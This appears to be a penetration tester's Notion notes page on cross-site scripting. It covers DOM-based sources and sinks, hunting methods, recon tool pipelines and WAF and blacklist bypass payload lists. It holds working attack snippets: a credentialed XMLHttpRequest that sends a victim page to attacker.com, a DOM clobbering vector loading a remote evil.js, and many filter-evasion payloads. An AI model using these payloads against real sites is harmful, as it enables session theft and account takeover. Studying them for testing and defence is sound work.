# XSS

Status: Erledigt
Tags: JavaScript (JS) (../Tags/JavaScript%20(JS)%2027f2c37daa29809aac00f50467f7187c.md), HTML (../Tags/HTML%2027f2c37daa29805eb66be9bf05414a38.md), XSS (../Tags/XSS%2027f2c37daa29805dadb2ff82553491b9.md), CSRF (../Tags/CSRF%2027f2c37daa2980a0aa8cf404707e4b45.md), Content Security Policy (CSP) (../Tags/Content%20Security%20Policy%20(CSP)%2027f2c37daa2980c1b9afd650decf5747.md), Account Takeover (ATO) (../Tags/Account%20Takeover%20(ATO)%2027f2c37daa2980f4abc6c479151370af.md), Session Tokens (Cookie) (../Tags/Session%20Tokens%20(Cookie)%2027f2c37daa29806eb79aee9d381a33b5.md), Authentication (../Tags/Authentication%2027f2c37daa29806cb382fb4d3ccf9448.md)
Tags 2: HTML, JS

https://github.com/s0md3v/XSStrike

https://github.com/payloadbox/xss-payload-list

https://github.com/ignis-sec/puff

[Advanced XSS and CSRF exploitation](https://app.notion.com/p/Advanced-XSS-and-CSRF-exploitation-08afda1cabd64f4da5a2d7cccf6311a7?pvs=21) 

https://github.com/coffinxp/img-payloads

# DOM Based Vulns

- Details
    
    ## **Taint-flow vulnerabilities**
    
    Many DOM-based vulnerabilities can be traced back to problems with the way client-side code manipulates attacker-controllable data
    
    **Sources**
    
    A source is a JavaScript property that accepts data that is potentially attacker-controlled. An example of a source is the `location.search` property because it reads input from the query string, which is relatively simple for an attacker to control. Ultimately, any property that can be controlled by the attacker is a potential source. This includes the referring URL (exposed by the `document.referrer` string), the user's cookies (exposed by the `document.cookie` string), and web messages.
    
    **Sinks**
    
    A sink is a potentially dangerous JavaScript function or 
    DOM object that can cause undesirable effects if attacker-controlled data is passed to it. For example, the `eval()` function is a sink because it processes the argument that is passed to it as JavaScript. An example of an HTML sink is `document.body.innerHTML` because it potentially allows an attacker to inject malicious HTML and execute arbitrary JavaScript.
    
    - Fundamentally, DOM-based vulnerabilities arise when a website passes data from a source to a sink, which then handles the data in an unsafe
    way in the context of the client's session
    - The most common source is the URL, which is typically accessed with the `location` object
    - An attacker can construct a link to send a victim to a vulnerable
    page with a payload in the query string and fragment portions of the URL
    
    ```
    goto = location.hash.slice(1)
    if (goto.startsWith('https:')) {
    	location = goto;
    }
    ```
    
    - This is vulnerable to [DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection) because the `location.hash` source is handled in an unsafe way
    - If the URL contains a hash fragment that starts with `https:`, this code extracts the value of the `location.hash` property and sets it as the `location` property of the `window`
    - An attacker could exploit this vulnerability by constructing the following URL
    - When a victim visits this URL, the JavaScript sets the value of the `location` property to `https://www.evil-user.net`, which automatically redirects the victim to the malicious site
    
    ```
    https://www.innocent-website.com/example#https://www.evil-user.net
    ```
    
    ## **What is DOM-based open redirection?**
    
    - DOM-based open-redirection vulnerabilities arise when a script
    writes attacker-controllable data into a sink that can trigger
    cross-domain navigation
    - For example, the following code is vulnerable due to the unsafe way it handles the `location.hash` property
    
    ```
    let url = /https?:\/\/.+/.exec(location.hash);
    if (url) {
    	location = url[0];
    }
    ```
    
    ## **What is the impact of DOM-based open redirection?**
    
    This behavior can be leveraged to facilitate phishing 
    attacks against users of the website, for example. The ability to use an authentic application URL targeting the correct domain and with a valid TLS certificate (if TLS is used) lends credibility to the phishing attack because many users, even if they verify these features, will not notice the subsequent redirection to a different domain.
    
    If an attacker is able to control the start of the string that is passed to the redirection API, then it may be possible to escalate this vulnerability into a JavaScript injection attack. An attacker could construct a URL with the `javascript:` pseudo-protocol to execute arbitrary code when the URL is processed by the browser
    
    **DOM-based open-redirection Sinks**
    
    ```
    location
    location.host
    location.hostname
    location.href
    location.pathname
    location.search
    location.protocol
    location.assign()
    location.replace()
    open()
    element.srcdoc
    XMLHttpRequest.open()
    XMLHttpRequest.send()
    jQuery.ajax()
    $.ajax()
    ```
    
    **DOM-based Common sources**
    
    ```
    document.URL
    document.documentURI
    document.URLUnencoded
    document.baseURI
    location
    document.cookie
    document.referrer
    window.name
    history.pushState
    history.replaceState
    localStorage
    sessionStorage
    IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
    Database
    ```
    
    ## **Web messages (postMessage)**
    
    - Consider this code
    
    ```
    <script>
    window.addEventListener('message', function(e) {
    	eval(e.data);
    });
    </script>
    ```
    
    - This is vulnerable because an attacker could inject a JavaScript payload by constructing the following `iframe`
    
    ```
    <iframe
    	src="//vulnerable-website"
    	onload="this.contentWindow.postMessage('<img src=1 onerror=print()','*')"
    >
    ```
    
    - As the event listener does not verify the origin of the message, and the `postMessage()` method specifies the `targetOrigin` `"*"`, the event listener accepts the payload and passes it into a sink, in this case, the `eval()` function
    
    ### **Origin verification**
    
    - Even if an event listener does include some form of origin
    verification, this verification step can sometimes be fundamentally
    flawed
    
    ```
    window.addEventListener('message', function(e)
    {
    	if (e.origin.indexOf('normal-website.com') > -1) {
    		eval(e.data);
    	}
    });
    ```
    
    - The `indexOf` method is used to try and verify that the origin of the incoming message is the `normal-website.com` domain
    - However, in practice, it only checks whether the string `"normal-website.com"` is contained anywhere in the origin URL
    - As a result, an attacker could easily bypass this verification step if the origin of their malicious message was `http://www.normal-website.com.evil.net`
    - The same flaw also applies to verification checks that rely on the `startsWith()` or `endsWith()` methods
    - For example, the following event listener would regard the origin `http://www.malicious-websitenormal-website.com` as safe
    
    ```
    window.addEventListener('message', function(e)
    {
    	if (e.origin.endsWith('normal-website.com'))
    	{
    		eval(e.data);
    	}
    });
    ```
    
    ## **DOM clobbering**
    
    - DOM clobbering is a technique in which you inject HTML into a page to manipulate the DOM and ultimately change the behavior of JavaScript on the page
    - DOM clobbering is particularly useful in cases where [XSS](https://portswigger.net/web-security/cross-site-scripting) is not possible, but you can control some HTML on a page where the attributes `id` or `name` are whitelisted by the HTML filter
    - The most common form of DOM clobbering uses an anchor element to
    overwrite a global variable, which is then used by the application in an unsafe way, such as generating a dynamic script URL
    - The term clobbering comes from the fact that you are "clobbering" a global variable or property of an object and overwriting it with a DOM node or HTML collection instead
    - For example, you can use DOM objects to overwrite other JavaScript objects and exploit unsafe names, such as `submit`, to interfere with a form's  actual `submit()` function
    
    **How to exploit DOM-clobbering vulnerabilities**
    
    - A common pattern used by JavaScript developers is
    
    ```
    var someObject = window.someObject || {..};
    ```
    
    - If you can control some of the HTML on the page, you can clobber the `someObject` reference with a DOM node, such as an anchor
    
    ```
    <script>
    	window.onload = function() {
    		let someObject = window.someObject || {};
    		let script = document.createElement('script');
    		script.src = someObject.url;
    		document.body.appendChild(script);
    	};
    </script>
    ```
    
    - Inject the following HTML to clobber the `someObject` reference with an anchor element
    
    ```
    <a id=someObject>
    <a id=someObject name=url href=//malicious-website.com/evil.js>
    ```
    
    - As the two anchors use the same ID, the DOM groups them together in a DOM collection
    - The DOM clobbering vector then overwrites the `someObject` reference with this DOM collection
    - A `name` attribute is used on the last anchor element in order to clobber the `url` property of the `someObject` object, which points to an external script
    - Another common technique is to use a `form` element along with an element such as `input` to clobber DOM properties
    - For example, clobbering the `attributes` property enables you to bypass client-side filters that use it in their logic
    - Although the filter will enumerate the `attributes` property, it will not actually remove any attributes because the property has been clobbered with a DOM node
    - As a result, you will be able to inject malicious attributes that would normally be filtered out
    
    ```
    <form onclick=alert(1)><input id=attributes>Click me
    ```
    
    - In this case, the client-side filter would traverse the DOM and encounter a whitelisted `form` element
    - Normally, the filter would loop through the `attributes` property of the `form` element and remove any blacklisted attributes
    - However, because the `attributes` property has been clobbered with the `input` element, the filter loops through the `input` element instead
    - As the `input` element has an undefined length, the conditions for the `for` loop of the filter (for example `i<element.attributes.length`) are not met, and the filter simply moves on to the next element instead
    - This results in the `onclick` event being ignored altogether by the filter, which subsequently allows the `alert()` function to be called in the browser
    
    **How to prevent DOM-clobbering attacks**
    
    In the simplest terms, you can prevent DOM-clobbering 
    attacks by implementing checks to make sure that objects or functions are what you expect them to be. For instance, you can check that the attributes property of a DOM node is actually an instance of `NamedNodeMap`. This ensures that the property is an attributes property and not a clobbered HTML element.
    
    You should also avoid writing code that references a global variable in conjunction with the logical OR operator `||`, as this can lead to DOM clobbering vulnerabilities.
    
    In summary:
    
    - Check that objects and functions are legitimate. If you are
    filtering the DOM, make sure you check that the object or function is
    not a DOM node.
    - Avoid bad code patterns. Using global variables in conjunction with the logical OR operator should be avoided.
    - Use a well-tested library, such as DOMPurify, that accounts for DOM-clobbering vulnerabilities.
    
    ## **Coockie manipulation**
    
    - Some DOM-based vulnerabilities allow attackers to manipulate data that they do not typically control
    - This transforms normally-safe data types, such as cookies, into potential sources
    - DOM-based cookie-manipulation vulnerabilities arise when a script writes attacker-controllable data into the value of a cookie
    - An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will set an arbitrary value in the user's cookie
    - Many sinks are largely harmless on their own, but DOM-based
    cookie-manipulation attacks demonstrate how low-severity vulnerabilities can sometimes be used as part of an exploit chain for a high-severity attack
    - For example, if JavaScript writes data from a source into `document.cookie` without sanitizing it first, an attacker can manipulate the value of a single cookie to inject arbitrary values
    - If the website unsafely reflects values from cookies without
    HTML-encoding them, an attacker can use cookie-manipulation techniques
    to exploit this behavior
    
    ```
    document.cookie = 'cookieName='+location.hash.slice(1);
    ```
    
    **Impact**
    
    - The potential impact of this vulnerability depends on the role that the cookie plays within the website
    - If the cookie is used to control the behavior that results from
    certain user actions (for example, a production versus demo mode setting), then the attacker may be able to cause the user to perform unintended actions by manipulating the cookie's value
    - If the cookie is used to track the user's session, then the attacker may be able to perform a session fixation attack, in which they set the cookie's value to a valid token that they have obtained from thewebsite, and then hijack the session during the victim's subsequent interaction with the website
    - A cookie-manipulation vulnerability like this can be used to attacknot only the vulnerable website, but any other website under the same parent domain
    - The `document.cookie` sink can lead to DOM-based cookie-manipulation vulnerabilities
    
    ## **JS Injection**
    
    - DOM-based JavaScript-injection vulnerabilities arise when a script executes attacker-controllable data as JavaScript
    - An attacker may be able to use the vulnerability to construct a URL that, if visited by another user, will cause arbitrary JavaScript supplied by the attacker to execute in the context of the user's browser session
    - The attacker-supplied code can perform a wide variety of actions,such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, or even logging their keystrokes
    
    **Sinks**
    
    ```
    eval()
    Function()
    setTimeout()
    setInterval()
    setImmediate()
    execCommand()
    execScript()
    msSetImmediate()
    range.createContextualFragment()
    crypto.generateCRMFRequest()
    ```
    
    **Document-domain manipulation**
    
    - Document-domain manipulation vulnerabilities arise when a script uses attacker-controllable data to set the `document.domain` property
    - An attacker may be able to use the vulnerability to construct a URL that, if visited by another user, will cause the response page to set an arbitrary `document.domain` value
    - The `document.domain` property is used by browsers in their enforcement of the same origin policy
    - If two pages from different origins explicitly set the same `document.domain` value, then those two pages can interact in unrestricted ways
    - If an attacker can cause a page of a targeted website and another page they control (either directly, or via an XSS-like vulnerability) to set the same `document.domain` value, then the attacker may be able to fully compromise the target page via the page they already control
    - Browsers generally enforce some restrictions on the values that can be assigned to `document.domain`, and may prevent the use of completely different values than the actual origin of the page
    - However, there are two important caveats to this
        - Firstly, browsers allow the use of child or parent domains, so an
        attacker may be able to switch the domain of the target page to that of a related website with a weaker security posture
        - Secondly, some browser quirks enable switching to completely unrelated domains
    - These caveats mean that the ability to manipulate the `document.domain` property of a page generally represents a security vulnerability whose severity is not far behind regular XSS
    
    ## **WebSocket-URL poisoning**
    
    - WebSocket-URL poisoning occurs when a script uses controllable data as the target URL of a WebSocket connection
    - An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will cause the user's browser to open a WebSocket connection to a URL that is under the attacker's control
    - `WebSocket` constructor can lead to WebSocket-URL poisoning vulnerabilities
    
    ## **Link manipulation**
    
    - DOM-based link-manipulation vulnerabilities arise when a script writes attacker-controllable data to a navigation target within the current page, such as a clickable link or the submission URL of a form
    - An attacker might be able to use this vulnerability to construct a URL that, if visited by another application user, will modify the target of links within the response
    - An attacker may be able to leverage this vulnerability to perform various attacks, including
        - Causing the user to be redirected to an arbitrary external URL, which could facilitate a phishing attack
        - Causing the user to submit sensitive form data to a server controlled by the attacker
        - Changing the file or query string associated with a link, causing
        the user to perform an unintended action within the application
        - Bypassing browser anti-XSS defenses by injecting on-site links
        containing XSS exploits. This works because anti-XSS defenses do not
        typically account for on-site links
    
    **Sinks**
    
    ```
    element.href
    element.src
    element.action
    ```
    
    ## **Ajax request-header manipulation**
    
    - Using Ajax enables a website to make asynchronous requests to the server so that web applications can dynamically change content on the page without the need to reload the entire page
    - However, Ajax request-header manipulation vulnerabilities arise when a script writes attacker-controllable data into the request header of an Ajax request that is issued using an `XmlHttpRequest` object
    - An attacker may be able to use this vulnerability to construct a
    URL that, if visited by another user, will set an arbitrary header in the subsequent Ajax request
    - This can then be used as a starting point to chain together other kinds of attack, thereby increasing the potential severity of this vulnerability
    
    **Sinks**
    
    ```
    XMLHttpRequest.setRequestHeader()
    XMLHttpRequest.open()
    XMLHttpRequest.send()
    jQuery.globalEval()
    $.globalEval()
    ```
    
    ## **File-path manipulation**
    
    - Local file-path manipulation vulnerabilities arise when a script
    passes attacker-controllable data to a file-handling API as the `filename` parameter
    - An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will cause the user's browser to open an arbitrary local file
    
    **Impact**
    
    - If the website reads data from the file, the attacker may be able to retrieve this data
    - If the website writes specific data to a sensitive file, the
    attacker may also be able write their own data to the file, which could
    be the configuration file of the operating system, for example
    
    **Sinks**
    
    ```
    FileReader.readAsArrayBuffer()
    FileReader.readAsBinaryString()
    FileReader.readAsDataURL()
    FileReader.readAsText()
    FileReader.readAsFile()
    FileReader.root.getFile()
    ```
    
    ## **SQLi**
    
    - Client-side SQL-injection vulnerabilities arise when a script
    incorporates attacker-controllable data into a client-side SQL query in an unsafe way
    - An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will execute an arbitrary SQL query within the local SQL database of the user's browser
    
    **Sinks**
    
    - `executeSql()`
    
    **How to prevent DOM-based client-side SQL-injection vulnerabilities**
    
    In addition to the general measures described on the [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based) page, you should make sure that you use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to safely incorporate potentially tainted data into SQL queries:
    
    - The application specifies the structure of the query, leaving placeholders for each item of user input.
    - The application specifies the contents of each placeholder. As the
    structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with
    the query structure.
    
    In the JavaScript `executeSql()` API, parameterized items can be designated within the query string using the query character `?`.
    For each parameterized item, an additional parameter is passed to the API containing the item's value. To prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application, it is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted.
    
    ## **HTML5-Storage manipluation**
    
    - HTML5-storage manipulation vulnerabilities arise when a script
    stores attacker-controllable data in the HTML5 storage of the web browser (either `localStorage` or `sessionStorage`)
    - An attacker may be able to use this behavior to construct a URL that, if visited by another user, will cause the user's browser to store attacker-controllable data
    - This behavior does not in itself constitute a security vulnerability
    - However, if the application later reads data back from storage and processes it in an unsafe way, an attacker may be able to leverage the storage mechanism to deliver other DOM-based attacks, such as [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) and JavaScript injection
    
    **Sinks**
    
    ```
    sessionStorage.setItem()
    localStorage.setItem()
    ```
    
    **Client-side XPath injection**
    
    - DOM-based XPath-injection vulnerabilities arise when a script incorporates attacker-controllable data into an XPath query
    - An attacker may be able to use this behavior to construct a URL that, if visited by another application user, will trigger the execution of an arbitrary XPath query, which could cause different data to be retrieved and processed by the website
    
    **Sinks**
    
    ```
    document.evaluate()
    element.evaluate()
    ```
    
    ## **Client-side JSON injection**
    
    - DOM-based JSON-injection vulnerabilities arise when a script
    incorporates attacker-controllable data into a string that is parsed as a JSON data structure and then processed by the application
    - An attacker may be able to use this behavior to construct a URL that, if visited by another user, will cause arbitrary JSON data to be processed
    
    **Sinks**
    
    ```
    JSON.parse()
    jQuery.parseJSON()
    $.parseJSON()
    ```
    
    ## **DOM-data manipulation**
    
    - DOM-data manipulation vulnerabilities arise when a script writes attacker-controllable data to a field within the DOM that is used within the visible UI or client-side logic
    - An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will modify the appearance or behavior of the client-side UI
    - DOM-data manipulation vulnerabilities can be exploited by both reflected and stored DOM-based attacks
    
    **Sinks**
    
    ```
    script.src
    script.text
    script.textContent
    script.innerText
    element.setAttribute()
    element.search
    element.text
    element.textContent
    element.innerText
    element.outerText
    element.value
    element.name
    element.target
    element.method
    element.type
    element.backgroundImage
    element.cssText
    element.codebase
    document.title
    document.implementation.createHTMLDocument()
    history.pushState()
    history.replaceState()
    ```
    
    ## **DOS**
    
    - DOM-based denial-of-service vulnerabilities arise when a script passes attacker-controllable data in an unsafe way to a problematic platform API, such as an API whose invocation can cause the user's computer to consume excessive amounts of CPU or disk space
    - This may result in side effects if the browser restricts the
    functionality of the website, for example, by rejecting attempts to store data in `localStorage` or killing busy scripts
    
    **Sinks**
    
    ```
    requestFileSystem()
    RegExp()
    ```
    

## Methodology

1. Check if **any value you control** (*parameters*, *path*, *headers*?, *cookies*?) is being **reflected** in the HTML or **used** by **JS** code
2. **Find the context** where it's reflected/used
3. If **reflected**
    - Check **which symbols can you use** and depending on that, prepare the payload:
        - In **raw HTML**:
            - Can you create new HTML tags?
            - Can you use events or attributes supporting `javascript:` protocol?
            - Can you bypass protections?
            - Is the HTML content being interpreted by any client side JS engine (*AngularJS*, *VueJS*, *Mavo*...), you could abuse a **Client Side Template Injection**
            - If you cannot create HTML tags that execute JS code, could you abuse a **Dangling Markup - [Dangling Markup ](Dangling%20Markup%20d51af4ee29614630a89ac971b6349427.md)**
        - Inside a **HTML tag**:
            - Can you exit to raw HTML context?
            - Can you create new events/attributes to execute JS code?
            - Does the attribute where you are trapped support JS execution?
            - Can you bypass protections?
        - Inside **JavaScript code**:
            - Can you escape the `<script>` tag?
            - Can you escape the string and execute different JS code?
            - Are your input in template literals ``?
            - Can you bypass protections?
        - Javascript **function** being **executed**
            - You can indicate the name of the function to execute. e.g.: `?callback=alert(1)`
4. If **used**:
    - You could exploit a **DOM XSS**, pay attention how your input is controlled and if your **controlled input is used by any sink.**

# CSP Bypasses

[Content Security Policy (CSP)](https://app.notion.com/p/Content-Security-Policy-CSP-aaffdd81fb9945cca04e50492dbce525?pvs=21) 

https://github.com/CanardMandarin/csp-bypass

https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/

# Fuzzing XSS via parameter with puff

- Use the output of `paramspider` of to fuzz for XSS with `puff`
    
    [paramspider](XSS/paramspider%20b9361408a1674597b478e10d03a306b9.md)
    

# Using Burp

1. Download Reflection and sentinal plugin for burp
2. Walk and spider the target site
3. Check the reflected params tab in burp
4. Send that to sentinal or check manually

# Using Waybackurls and other similar site

1. Use [Gau](https://github.com/lc/gau) or [Wayback](https://github.com/tomnomnom/waybackurls) to passively gather urls of the target.
2. Filter the parameters using `grep "="` or `gf patterns` and store it in a new file
3. Now run [Gxss,](https://github.com/KathanP19/Gxss) [bxss](https://github.com/ethicalhackingplayground/bxss/) on that new file
4. Check Reflected Param Manually or use some tool like [dalfox](https://github.com/hahwul/dalfox) or puff

# Using Google Dorks

1. Using Google Dork `site:target.com` filter the result
2. Now search for links which have params by adding more dorks something like `site:target.com inurl:".php?"` or `site:target.com filetype:php` etc you can find some dorks at this link [https://www.openbugbounty.org/blog/devl00p/top-100-xss-dorks/](https://www.openbugbounty.org/blog/devl00p/top-100-xss-dorks/) or google it out
3. Check if the param value is getting reflected in html source code
4. Try XSS payloads there or pass them to some tool

# Find Hidden Variables In Source Code.

1. Check Javascript file or html Source file for hidden or unused variables
    1. Or use [Arjun](https://github.com/s0md3v/Arjun)
2. You can Manually Check Right Click View Page Source and search for `var=` , `=""` , `=''`
3. Now Append that to webpage urls. For example `https://example.com?hiddenvariablename=xss`

# Server Side XSS (Dynamic PDF)

[HTML Injection in PDF generators](https://app.notion.com/p/HTML-Injection-in-PDF-generators-392f660c897f4d638319c64e1907a8b4?pvs=21) 

[Server Side XSS (Dynamic PDF)](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf)

# Automated XSS

1. Use waybackurls and other tools to fetch URLs
2. Extract possible parameters via gf
3. Use [dalfox](https://github.com/hahwul/dalfox) to find XSS

```python
waybackurls testphp.vulnweb.com | gf xss | sed 's/=.*/=/' | sort -u | tee Possible_xss.txt && cat Possible_xss.txt | dalfox -b majix.bxss.in pipe > output.txt
```

- Other tool for hunting https://github.com/theinfosecguy/QuickXSS

# Simple Request with credentials

- Also usefull when attacking [Cache Poisoning](Cache%20Poisoning%2083ece7478d4c4a6295f345c3b64b216d.md)

```bash
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://victim.com', true);
xhr.withCredentials = true;
xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
        var response = xhr.responseText;
        var reportXhr = new XMLHttpRequest();
        reportXhr.open('POST', 'http://attacker.com', true);
        reportXhr.setRequestHeader('Content-Type', 'application/json');
        reportXhr.send(JSON.stringify({response: response}));
    }
};
xhr.send();
```

# Filter Evasion Tipps

[XSS Filter Bypasses](https://app.notion.com/p/XSS-Filter-Bypasses-407ae0b54bed4996aa67a32f284a7d57?pvs=21) 

https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet

- `<` and `>` can be replace with html entities `&lt;` and `&gt;`
- You can try an XSS polyglot
    - `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`
        
        [XSS Polyglot payloads](https://gist.github.com/michenriksen/d729cd67736d750b3551876bbedbe626)
        
- Firewall bypasses
    
    ```jsx
    <scRipT>alert(1)</scRipT>
    <script>%0alert(1)</script>
    <src<script>ipt>alert(1);</scr</script>ipt>
    <a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;">
    <svg•onload=alert(1)>
    %2522 // Double Encoding
    GET /?q=xss -> POST/ q=xss // Change the request method
    GET /%0A%ODValue=%20Virus -> POST Value= Virus // CRLF Injection
    ```
    
- Blacklist bypasses
    
    ```html
    //Random capitalization
    <script> --> <ScrIpT>
    <img --> <ImG
    
    //Double tag, in case just the first match is removed
    <script><script>
    <scr<script>ipt>
    <SCRscriptIPT>alert(1)</SCRscriptIPT>
    
    //You can substitude the space to separate attributes for:
    /
    /*%00/
    /%00*/
    %2F
    %0D
    %0C
    %0A
    %09
    
    //Unexpected parent tags
    <svg><x><script>alert('1'&#41</x>
    
    //Unexpected weird attributes
    <script x>
    <script a="1234">
    <script ~~~>
    <script/random>alert(1)</script>
    <script      ///Note the newline
    >alert(1)</script>
    <scr\x00ipt>alert(1)</scr\x00ipt>
    
    //Not closing tag, ending with " <" or " //"
    <iframe SRC="javascript:alert('XSS');" <
    <iframe SRC="javascript:alert('XSS');" //
    
    //Extra open
    <<script>alert("XSS");//<</script>
    
    //Just weird an unexpected, use your imagination
    <</script/script><script>
    <input type=image src onerror="prompt(1)">
    
    //Using `` instead of parenthesis
    onerror=alert`1`
    
    //Use more than one
    <<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
    ```
    

---

[XSS](https://kathan19.gitbook.io/howtohunt/xss/xss)

[XSS (Cross Site Scripting)](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)